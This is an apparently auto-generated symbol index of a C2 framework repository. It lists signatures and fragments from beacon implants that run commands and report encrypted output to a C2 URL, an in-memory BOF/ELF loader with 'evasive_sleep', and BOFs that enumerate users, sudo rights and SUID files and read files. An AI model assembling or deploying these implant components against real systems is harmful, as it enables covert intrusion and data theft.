### bsb_backoff_init (function) `bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);`
- Defined: `beacons/v1/beacon.c:163`
- Depends on: `include/beacon_common.h`

### sleep (function) `sleep(bsb_backoff_next(&backoff));`
- Defined: `beacons/v1/beacon.c:173`
- Depends on: `include/beacon_common.h`

### bsb_backoff_reset (function) `bsb_backoff_reset(&backoff);`
- Defined: `beacons/v1/beacon.c:200`
- Depends on: `include/beacon_common.h`

### bsb_output_cleanup (function) `bsb_output_cleanup();`
- Defined: `beacons/v1/beacon.c:211`
- Depends on: `include/beacon_common.h`

## beacons/v1/gopher_beacon.c

### __attribute__ (function) `static void __attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...`
- Defined: `beacons/v1/gopher_beacon.c:137`

### BeaconPrintf (function) `void BeaconPrintf(int type, const char *fmt, ...)`
- Defined: `beacons/v1/gopher_beacon.c:190`
- Doc: === BEACON API ===

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len)`
- Defined: `beacons/v1/gopher_beacon.c:202`

### create_trampoline (function) `static void* create_trampoline(void* target)`
- Defined: `beacons/v1/gopher_beacon.c:214`
- Doc: === CRATE TRAPOLINE ===

### cleanup_trampolines (function) `static void cleanup_trampolines(void)`
- Defined: `beacons/v1/gopher_beacon.c:250`
- Doc: === CLEAN TRAMPOLINE ===

### get_or_create_trampoline (function) `static void* get_or_create_trampoline(void* target)`
- Defined: `beacons/v1/gopher_beacon.c:265`

### WriteMemoryCallback (function) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- Defined: `beacons/v1/gopher_beacon.c:297`
- Doc: === CURL WRITE CALLBACK ===

### gopher_request (function) `char* gopher_request(const char* host, int port, const char* selector, const char* method, const ...`
- Defined: `beacons/v1/gopher_beacon.c:314`
- Doc: === GOPHER REQUEST () ===

### base64_encode (function) `char* base64_encode(const unsigned char* input, int len)`
- Defined: `beacons/v1/gopher_beacon.c:377`
- Doc: === BASE64 ===

### base64_decode (function) `unsigned char* base64_decode(const char* input, int* len)`
- Defined: `beacons/v1/gopher_beacon.c:393`

### aes256_cfb_encrypt (function) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacons/v1/gopher_beacon.c:417`
- Doc: === AES CFB ===

### aes256_cfb_decrypt (function) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacons/v1/gopher_beacon.c:444`

### exec_cmd (function) `char* exec_cmd(const char* cmd, int* out_len)`
- Defined: `beacons/v1/gopher_beacon.c:475`
- Doc: === EXEC CMD ===

### page_align (function) `static size_t page_align(size_t size)`
- Defined: `beacons/v1/gopher_beacon.c:506`
- Doc: === Función auxiliar: alinear al tamaño de página ===

### RunELF (function) `int RunELF(const char* functionname, unsigned char* elf_data, uint32_t filesize, 
           unsi...`
- Defined: `beacons/v1/gopher_beacon.c:511`

### get_local_ips (function) `char* get_local_ips()`
- Defined: `beacons/v1/gopher_beacon.c:893`
- Doc: === GET LOCAL IPs ===

### download_bof (function) `unsigned char* download_bof(const char* bof_selector, size_t* out_size)`
- Defined: `beacons/v1/gopher_beacon.c:922`
- Doc: === DOWNLOAD BOF ===

### run_bof_and_capture (function) `char* run_bof_and_capture(unsigned char* elf_data, uint32_t filesize,
                          c...`
- Defined: `beacons/v1/gopher_beacon.c:950`
- Doc: === RUN BOF AND CAPTURE ===

### main (function) `int main()`
- Defined: `beacons/v1/gopher_beacon.c:994`
- Doc: === MAIN ===

### void (function) `typedef void (*bof_func_t)(char*, int);`
- Defined: `beacons/v1/gopher_beacon.c:60`
- Doc: === TIPOS Y SÍMBOLOS FALTANTES ===

### volatile (function) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //`
- Defined: `beacons/v1/gopher_beacon.c:143`
- Doc: CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el 

### va_start (function) `va_start(args, fmt);`
- Defined: `beacons/v1/gopher_beacon.c:193`

### va_end (function) `va_end(args);`
- Defined: `beacons/v1/gopher_beacon.c:197`

### memcpy (function) `memcpy(g_beacon_output + g_output_len, data, len);`
- Defined: `beacons/v1/gopher_beacon.c:208`

### fprintf (function) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
- Defined: `beacons/v1/gopher_beacon.c:221`

### munmap (function) `munmap(code, code_size);`
- Defined: `beacons/v1/gopher_beacon.c:237`

### free (function) `free(g_trampolines);`
- Defined: `beacons/v1/gopher_beacon.c:254`

### fflush (function) `fflush(stdout);`
- Defined: `beacons/v1/gopher_beacon.c:319`

### snprintf (function) `snprintf(full_selector, sizeof(full_selector), "/report/%s", post_data);`
- Defined: `beacons/v1/gopher_beacon.c:326`

### close (function) `close(sockfd);`
- Defined: `beacons/v1/gopher_beacon.c:345`

### send (function) `send(sockfd, req, strlen(req), 0);`
- Defined: `beacons/v1/gopher_beacon.c:350`

### BIO_set_flags (function) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- Defined: `beacons/v1/gopher_beacon.c:383`

### BIO_write (function) `BIO_write(b64, input, len);`
- Defined: `beacons/v1/gopher_beacon.c:384`

### BIO_flush (function) `BIO_flush(b64);`
- Defined: `beacons/v1/gopher_beacon.c:385`

### BIO_get_mem_ptr (function) `BIO_get_mem_ptr(b64, &bptr);`
- Defined: `beacons/v1/gopher_beacon.c:386`

### BIO_free_all (function) `BIO_free_all(b64);`
- Defined: `beacons/v1/gopher_beacon.c:390`

### AES_init_ctx (function) `AES_init_ctx(&ctx, key);`
- Defined: `beacons/v1/gopher_beacon.c:420`

### AES_ECB_encrypt (function) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- Defined: `beacons/v1/gopher_beacon.c:428`

### memset (function) `memset(iv_buf + block_size, 0, 16 - block_size);`
- Defined: `beacons/v1/gopher_beacon.c:437`

### strdup (function) `return strdup("[!] Empty command");`
- Defined: `beacons/v1/gopher_beacon.c:478`

### pclose (function) `pclose(fp);`
- Defined: `beacons/v1/gopher_beacon.c:488`

### perror (function) `perror("calloc");`
- Defined: `beacons/v1/gopher_beacon.c:682`

### call_bof_isolated (function) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- Defined: `beacons/v1/gopher_beacon.c:878`

### inet_ntop (function) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- Defined: `beacons/v1/gopher_beacon.c:912`

### strcat (function) `strcat(result, ip);`
- Defined: `beacons/v1/gopher_beacon.c:914`

### strlen (function) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- Defined: `beacons/v1/gopher_beacon.c:918`

### setvbuf (function) `setvbuf(stdout, NULL, _IOLBF, 0);`
- Defined: `beacons/v1/gopher_beacon.c:996`
- Doc: memcpy(output, g_beacon_output, g_output_len); output[g_output_len] = '\0'; out_len = g_output_len; fprintf(stderr, "[DE

### printf (function) `printf("[*] Beacon starting...\n");`
- Defined: `beacons/v1/gopher_beacon.c:998`

### srand (function) `srand(time(NULL));`
- Defined: `beacons/v1/gopher_beacon.c:1001`

### sleep (function) `sleep(6);`
- Defined: `beacons/v1/gopher_beacon.c:1028`

### gethostname (function) `gethostname(hostname, sizeof(hostname) - 1);`
- Defined: `beacons/v1/gopher_beacon.c:1122`

### cJSON_AddStringToObject (function) `cJSON_AddStringToObject(root, "output", output);`
- Defined: `beacons/v1/gopher_beacon.c:1130`

### cJSON_AddNumberToObject (function) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- Defined: `beacons/v1/gopher_beacon.c:1133`

### cJSON_AddNullToObject (function) `cJSON_AddNullToObject(root, "result_portscan");`
- Defined: `beacons/v1/gopher_beacon.c:1138`

### cJSON_Delete (function) `cJSON_Delete(root);`
- Defined: `beacons/v1/gopher_beacon.c:1142`

### RAND_bytes (function) `RAND_bytes(iv_out, 16);`
- Defined: `beacons/v1/gopher_beacon.c:1148`

## beacons/v2/beacon.c

### report_result (function) `static void report_result(const bsb_config_t *cfg,
                           const char *command...`
- Defined: `beacons/v2/beacon.c:65`
- Doc: Mesh functions would be implemented here, but for this refactor we keep the same structure as v1 with mesh stubs. A prod
- Depends on: `include/beacon_common.h`

### execute_command (function) `static char *execute_command(const bsb_config_t *cfg, const char *command)`
- Defined: `beacons/v2/beacon.c:138`
- Depends on: `include/beacon_common.h`

### main (function) `int main(void)`
- Defined: `beacons/v2/beacon.c:187`
- Depends on: `include/beacon_common.h`

### gethostname (function) `gethostname(hostname, sizeof(hostname) - 1);`
- Defined: `beacons/v2/beacon.c:70`
- Depends on: `include/beacon_common.h`

### cJSON_AddStringToObject (function) `cJSON_AddStringToObject(root, "output", output);`
- Defined: `beacons/v2/beacon.c:78`
- Depends on: `include/beacon_common.h`

### cJSON_AddNumberToObject (function) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- Defined: `beacons/v2/beacon.c:81`
- Depends on: `include/beacon_common.h`

### cJSON_AddNullToObject (function) `cJSON_AddNullToObject(root, "result_portscan");`
- Defined: `beacons/v2/beacon.c:86`
- Depends on: `include/beacon_common.h`

### cJSON_Delete (function) `cJSON_Delete(root);`
- Defined: `beacons/v2/beacon.c:90`
- Depends on: `include/beacon_common.h`

### free (function) `free(ips);`
- Defined: `beacons/v2/beacon.c:93`
- Depends on: `include/beacon_common.h`

### RAND_bytes (function) `RAND_bytes(iv_out, 16);`
- Defined: `beacons/v2/beacon.c:99`
- Depends on: `include/beacon_common.h`

### memcpy (function) `memcpy(full_enc, iv_out, 16);`
- Defined: `beacons/v2/beacon.c:109`
- Depends on: `include/beacon_common.h`

### snprintf (function) `snprintf(report_url, sizeof(report_url), "%s%s", cfg->c2.url, cfg->c2.report_uri);`
- Defined: `beacons/v2/beacon.c:115`
- Depends on: `include/beacon_common.h`

### srand (function) `srand(time(NULL));`
- Defined: `beacons/v2/beacon.c:189`
- Depends on: `include/beacon_common.h`

### fprintf (function) `fprintf(stderr, "config error: %s\n", cfg_err);`
- Defined: `beacons/v2/beacon.c:194`
- Depends on: `include/beacon_common.h`

### pthread_mutex_init (function) `pthread_mutex_init(&g_mesh.peers_mutex, NULL);`
- Defined: `beacons/v2/beacon.c:203`
- Depends on: `include/beacon_common.h`

### bsb_backoff_init (function) `bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);`
- Defined: `beacons/v2/beacon.c:209`
- Depends on: `include/beacon_common.h`

### sleep (function) `sleep(bsb_backoff_next(&backoff));`
- Defined: `beacons/v2/beacon.c:219`
- Depends on: `include/beacon_common.h`

### bsb_backoff_reset (function) `bsb_backoff_reset(&backoff);`
- Defined: `beacons/v2/beacon.c:246`
- Depends on: `include/beacon_common.h`

### bsb_output_cleanup (function) `bsb_output_cleanup();`
- Defined: `beacons/v2/beacon.c:257`
- Depends on: `include/beacon_common.h`

### pthread_mutex_destroy (function) `pthread_mutex_destroy(&g_mesh.peers_mutex);`
- Defined: `beacons/v2/beacon.c:259`
- Depends on: `include/beacon_common.h`

## beacons/v3/beacon.c

### infrastructure (function) `*
 * All shared infrastructure (HTTP client, crypto, BOF loader)
 * lives in beacon_common.c. Thi...`
- Defined: `beacons/v3/beacon.c:7`
- Depends on: `include/beacon_common.h`

### compute_primes (function) `static int compute_primes(int count)`
- Defined: `beacons/v3/beacon.c:35`
- Depends on: `include/beacon_common.h`

### evasive_sleep (function) `static void evasive_sleep(int seconds)`
- Defined: `beacons/v3/beacon.c:45`
- Depends on: `include/beacon_common.h`

### report_result (function) `static void report_result(const bsb_config_t *cfg,
                           const char *command...`
- Defined: `beacons/v3/beacon.c:51`
- Depends on: `include/beacon_common.h`

### execute_command (function) `static char *execute_command(const bsb_config_t *cfg, const char *command)`
- Defined: `beacons/v3/beacon.c:124`
- Depends on: `include/beacon_common.h`

### main (function) `int main(void)`
- Defined: `beacons/v3/beacon.c:173`
- Depends on: `include/beacon_common.h`

### sleep (function) `sleep(seconds);`
- Defined: `beacons/v3/beacon.c:49`
- Depends on: `include/beacon_common.h`

### gethostname (function) `gethostname(hostname, sizeof(hostname) - 1);`
- Defined: `beacons/v3/beacon.c:56`
- Depends on: `include/beacon_common.h`

### cJSON_AddStringToObject (function) `cJSON_AddStringToObject(root, "output", output);`
- Defined: `beacons/v3/beacon.c:64`
- Depends on: `include/beacon_common.h`

### cJSON_AddNumberToObject (function) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- Defined: `beacons/v3/beacon.c:67`
- Depends on: `include/beacon_common.h`

### cJSON_AddNullToObject (function) `cJSON_AddNullToObject(root, "result_portscan");`
- Defined: `beacons/v3/beacon.c:72`
- Depends on: `include/beacon_common.h`

### cJSON_Delete (function) `cJSON_Delete(root);`
- Defined: `beacons/v3/beacon.c:76`
- Depends on: `include/beacon_common.h`

### free (function) `free(ips);`
- Defined: `beacons/v3/beacon.c:79`
- Depends on: `include/beacon_common.h`

### RAND_bytes (function) `RAND_bytes(iv_out, 16);`
- Defined: `beacons/v3/beacon.c:85`
- Depends on: `include/beacon_common.h`

### memcpy (function) `memcpy(full_enc, iv_out, 16);`
- Defined: `beacons/v3/beacon.c:95`
- Depends on: `include/beacon_common.h`

### snprintf (function) `snprintf(report_url, sizeof(report_url), "%s%s", cfg->c2.url, cfg->c2.report_uri);`
- Defined: `beacons/v3/beacon.c:101`
- Depends on: `include/beacon_common.h`

### srand (function) `srand(time(NULL));`
- Defined: `beacons/v3/beacon.c:175`
- Depends on: `include/beacon_common.h`

### fprintf (function) `fprintf(stderr, "config error: %s\n", cfg_err);`
- Defined: `beacons/v3/beacon.c:180`
- Depends on: `include/beacon_common.h`

### bsb_backoff_init (function) `bsb_backoff_init(&backoff, cfg.backoff.base_seconds, cfg.backoff.max_seconds);`
- Defined: `beacons/v3/beacon.c:191`
- Depends on: `include/beacon_common.h`

### bsb_backoff_reset (function) `bsb_backoff_reset(&backoff);`
- Defined: `beacons/v3/beacon.c:230`
- Depends on: `include/beacon_common.h`

### bsb_output_cleanup (function) `bsb_output_cleanup();`
- Defined: `beacons/v3/beacon.c:241`
- Depends on: `include/beacon_common.h`

## bof.c

### __attribute__ (function) `__attribute__((used))
__attribute__((visibility("default")))
void go(char *args, int alen)`
- Defined: `bof.c:3`
- Doc: bof.c include "beacon.h"  // ← Incluir la API
- Depends on: `beacon.h`

### BeaconPrintf (function) `BeaconPrintf(CALLBACK_OUTPUT, "[TEST BOF] Somehow, I'm still alive. Args=%.*s\n", alen, args);`
- Defined: `bof.c:7`
- Depends on: `beacon.h`

## bof/cat/bof.c

### go (function) `void go(char *args, int alen)`
- Defined: `bof/cat/bof.c:14`
- Doc: bof/cat/bof.c  Read a file from disk and stream it back through the beacon.  args/alen: a NUL-terminated path string. Th
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### BeaconPrintf (function) `BeaconPrintf(CALLBACK_OUTPUT, "[cat] missing path argument\n");`
- Defined: `bof/cat/bof.c:17`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### BeaconOutput (function) `BeaconOutput(CALLBACK_OUTPUT, buffer, (int)n);`
- Defined: `bof/cat/bof.c:34`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### syscall1 (function) `syscall1(SYS_close, fd);`
- Defined: `bof/cat/bof.c:37`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

## bof/cat/cat.c

### syscall3 (function) `static inline long syscall3(long n, long a1, long a2, long a3)`
- Defined: `bof/cat/cat.c:21`
- Doc: Wrappers (copiados de tus ejemplos)

### go (function) `void go(char *args, int alen)`
- Defined: `bof/cat/cat.c:30`

### BeaconPrintf (function) `extern void BeaconPrintf(int, const char*, ...);`
- Defined: `bof/cat/cat.c:11`
- Doc: Símbolos del beacon

### BeaconOutput (function) `extern void BeaconOutput(int, const char*, int);`
- Defined: `bof/cat/cat.c:12`

### volatile (function) `__asm__ volatile ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory" );`
- Defined: `bof/cat/cat.c:23`

## bof/include/beacon_api.h

### go (function) `* * BOFs MUST export a function with this exact signature: * * void go(char *args, int alen);`
- Defined: `bof/include/beacon_api.h:7`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### BeaconDataParse (function) `void BeaconDataParse(datap *parser, char *buffer, int size);`
- Defined: `bof/include/beacon_api.h:35`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### BeaconDataPtr (function) `char *BeaconDataPtr(datap *parser, int size);`
- Defined: `bof/include/beacon_api.h:37`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### BeaconDataInt (function) `int BeaconDataInt(datap *parser);`
- Defined: `bof/include/beacon_api.h:38`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### BeaconDataShort (function) `short BeaconDataShort(datap *parser);`
- Defined: `bof/include/beacon_api.h:39`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### BeaconDataLength (function) `int BeaconDataLength(datap *parser);`
- Defined: `bof/include/beacon_api.h:40`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### BeaconDataExtract (function) `char *BeaconDataExtract(datap *parser, int *size);`
- Defined: `bof/include/beacon_api.h:41`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### buffer (function) `* takes a raw byte buffer (len may be 0 for strlen-style strings * but the buffer must still be NUL-terminated). */ void BeaconPrintf(int type, const char *fmt, ...);`
- Defined: `bof/include/beacon_api.h:44`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len);`
- Defined: `bof/include/beacon_api.h:47`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

## bof/include/syscalls.h

### syscall0 (function) `static inline long syscall0(long n)`
- Defined: `bof/include/syscalls.h:48`
- Doc: #define SYS_wait4      61 #define SYS_getuid     102 #define SYS_getgid     104 #define SYS_geteuid    107 #define SYS_g
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### syscall1 (function) `static inline long syscall1(long n, long a1)`
- Defined: `bof/include/syscalls.h:59`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### syscall2 (function) `static inline long syscall2(long n, long a1, long a2)`
- Defined: `bof/include/syscalls.h:70`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### syscall3 (function) `static inline long syscall3(long n, long a1, long a2, long a3)`
- Defined: `bof/include/syscalls.h:81`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### syscall4 (function) `static inline long syscall4(long n, long a1, long a2, long a3, long a4)`
- Defined: `bof/include/syscalls.h:92`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### bsf_strlen (function) `static inline size_t bsf_strlen(const char *s)`
- Defined: `bof/include/syscalls.h:106`
- Doc: static inline long syscall4(long n, long a1, long a2, long a3, long a4) { long ret; register long r10 __asm__("r10") = a
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### bsf_strcmp (function) `static inline int bsf_strcmp(const char *a, const char *b)`
- Defined: `bof/include/syscalls.h:113`
- Doc: : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10) : "rcx", "r11", "memory" ); return ret; } /* strlen - libc is not linked. 
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### bsf_memcmp (function) `static inline int bsf_memcmp(const void *p1, const void *p2, size_t n)`
- Defined: `bof/include/syscalls.h:119`
- Doc: /* strlen - libc is not linked. static inline size_t bsf_strlen(const char *s) { const char *p = s; while (*p) p++; retu
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

### volatile (function) `__asm__ volatile ( "syscall" : "=a"(ret) : "a"(n) : "rcx", "r11", "memory" );`
- Defined: `bof/include/syscalls.h:51`
- Imported by: `bof/cat/bof.c`, `bof/is_sudo/bof.c`, `bof/suid_enum/bof.c`, `bof/userenum/bof.c`, `bof/whoami/bof.c`

## bof/is_sudo/bof.c

### user_in_group (function) `static int user_in_group(const char *group, const char *username, char *filebuf, long filesize)`
- Defined: `bof/is_sudo/bof.c:14`
- Doc: bof/is_sudo/bof.c  Check whether the current user is in the sudo or wheel group.  Reads /etc/group, looks for the user's
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### go (function) `void go(char *args, int alen)`
- Defined: `bof/is_sudo/bof.c:56`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### BeaconPrintf (function) `BeaconPrintf(CALLBACK_OUTPUT, "[is_sudo] uid=0 (root)\n");`
- Defined: `bof/is_sudo/bof.c:68`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### BeaconOutput (function) `BeaconOutput(CALLBACK_OUTPUT, "yes", 0);`
- Defined: `bof/is_sudo/bof.c:69`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### syscall1 (function) `syscall1(SYS_close, fd);`
- Defined: `bof/is_sudo/bof.c:96`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

## bof/is_sudo/is_sudo.c

### syscall3 (function) `static inline long syscall3(long n, long a1, long a2, long a3)`
- Defined: `bof/is_sudo/is_sudo.c:23`
- Doc: Wrappers

### syscall1 (function) `static inline long syscall1(long n, long a1)`
- Defined: `bof/is_sudo/is_sudo.c:32`

### strcmp (function) `static int strcmp(const char *s1, const char *s2)`
- Defined: `bof/is_sudo/is_sudo.c:44`
- Doc: strcmp mínimo (necesario para comparar strings)

### get_username_from_uid (function) `static int get_username_from_uid(long uid, char *buf, int buf_size)`
- Defined: `bof/is_sudo/is_sudo.c:53`
- Doc: Obtener username desde /etc/passwd (sin libc)

### go (function) `void go(char *args, int alen)`
- Defined: `bof/is_sudo/is_sudo.c:108`

### BeaconPrintf (function) `extern void BeaconPrintf(int, const char*, ...);`
- Defined: `bof/is_sudo/is_sudo.c:11`
- Doc: Símbolos del beacon

### BeaconOutput (function) `extern void BeaconOutput(int, const char*, int);`
- Defined: `bof/is_sudo/is_sudo.c:12`

### volatile (function) `__asm__ volatile ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory" );`
- Defined: `bof/is_sudo/is_sudo.c:25`

## bof/suid_enum/bof.c

### flush_output (function) `static void flush_output(void)`
- Defined: `bof/suid_enum/bof.c:75`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### emit (function) `static void emit(const char *s)`
- Defined: `bof/suid_enum/bof.c:82`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### format_mode (function) `static void format_mode(unsigned int mode, char *out)`
- Defined: `bof/suid_enum/bof.c:105`
- Doc: Format `mode` (a st_mode value) into a 10-char permission * string, like ls -l does.
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### path_reset (function) `static void path_reset(const char *root)`
- Defined: `bof/suid_enum/bof.c:125`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### path_append (function) `static void path_append(const char *name)`
- Defined: `bof/suid_enum/bof.c:134`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### path_trim_to (function) `static void path_trim_to(int len)`
- Defined: `bof/suid_enum/bof.c:148`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### walk (function) `static void walk(int depth)`
- Defined: `bof/suid_enum/bof.c:158`
- Doc: Walk one directory, recursing into subdirectories. `depth` * bounds the recursion so a symlink loop cannot blow the stac
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### go (function) `void go(char *args, int alen)`
- Defined: `bof/suid_enum/bof.c:246`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### BeaconOutput (function) `BeaconOutput(CALLBACK_OUTPUT, out_buf, out_pos);`
- Defined: `bof/suid_enum/bof.c:78`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### syscall1 (function) `syscall1(SYS_close, fd);`
- Defined: `bof/suid_enum/bof.c:244`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### BeaconPrintf (function) `BeaconPrintf(CALLBACK_OUTPUT, "[suid_enum] scanning %s\n", root);`
- Defined: `bof/suid_enum/bof.c:259`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

## bof/userenum/bof.c

### user_in_member_list (function) `static int user_in_member_list(const char *username, const char *members)`
- Defined: `bof/userenum/bof.c:51`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### go (function) `void go(char *args, int alen)`
- Defined: `bof/userenum/bof.c:67`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### syscall1 (function) `syscall1(SYS_close, fd);`
- Defined: `bof/userenum/bof.c:86`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### copy_group_members (function) `copy_group_members("sudo", gbuf, total, sudo_members, sizeof(sudo_members));`
- Defined: `bof/userenum/bof.c:87`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### BeaconPrintf (function) `BeaconPrintf(CALLBACK_OUTPUT, "[userenum] cannot open /etc/passwd\n");`
- Defined: `bof/userenum/bof.c:93`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

## bof/userenum/userenum.c

### syscall3 (function) `static inline long syscall3(long n, long a1, long a2, long a3)`
- Defined: `bof/userenum/userenum.c:21`
- Doc: Wrappers

### strcmp (function) `static int strcmp(const char *s1, const char *s2)`
- Defined: `bof/userenum/userenum.c:33`
- Doc: strcmp mínimo (necesario para comparar strings)

### go (function) `void go(char *args, int alen)`
- Defined: `bof/userenum/userenum.c:40`

### BeaconPrintf (function) `extern void BeaconPrintf(int, const char*, ...);`
- Defined: `bof/userenum/userenum.c:11`
- Doc: Símbolos del beacon

### BeaconOutput (function) `extern void BeaconOutput(int, const char*, int);`
- Defined: `bof/userenum/userenum.c:12`

### volatile (function) `__asm__ volatile ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory" );`
- Defined: `bof/userenum/userenum.c:23`

## bof/whoami/bof.c

### go (function) `void go(char *args, int alen)`
- Defined: `bof/whoami/bof.c:18`
- Doc: BeaconPrintf/BeaconOutput are declared in beacon_api.h, which the * beacon's loader resolves by symbol name.
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### BeaconPrintf (function) `BeaconPrintf(CALLBACK_OUTPUT, "[whoami] uid=0 (root)\n");`
- Defined: `bof/whoami/bof.c:30`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

### BeaconOutput (function) `BeaconOutput(CALLBACK_OUTPUT, "root", 0);`
- Defined: `bof/whoami/bof.c:31`
- Depends on: `bof/include/beacon_api.h`, `bof/include/syscalls.h`

## bof/whoami/whoami.c

### syscall3 (function) `static inline long syscall3(long n, long a1, long a2, long a3)`
- Defined: `bof/whoami/whoami.c:21`
- Doc: Syscall wrappers

### syscall1 (function) `static inline long syscall1(long n, long a1)`
- Defined: `bof/whoami/whoami.c:30`

### go (function) `void go(char *args, int alen)`
- Defined: `bof/whoami/whoami.c:40`

### BeaconPrintf (function) `extern void BeaconPrintf(int, const char*, ...);`
- Defined: `bof/whoami/whoami.c:10`
- Doc: Símbolos del beacon

### BeaconOutput (function) `extern void BeaconOutput(int, const char*, int);`
- Defined: `bof/whoami/whoami.c:11`

### volatile (function) `__asm__ volatile ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory" );`
- Defined: `bof/whoami/whoami.c:23`

## c2/server.py

### load_runtime_config (function) `def load_runtime_config()`
- Defined: `c2/server.py:59`
- Doc: Load configuration from JSON file or use defaults.
- Depends on: `include/config_py.py`
- Imported by: `tests/test_c2_server.py`

### compute_hmac (function) `def compute_hmac(key, data)`
- Defined: `c2/server.py:86`
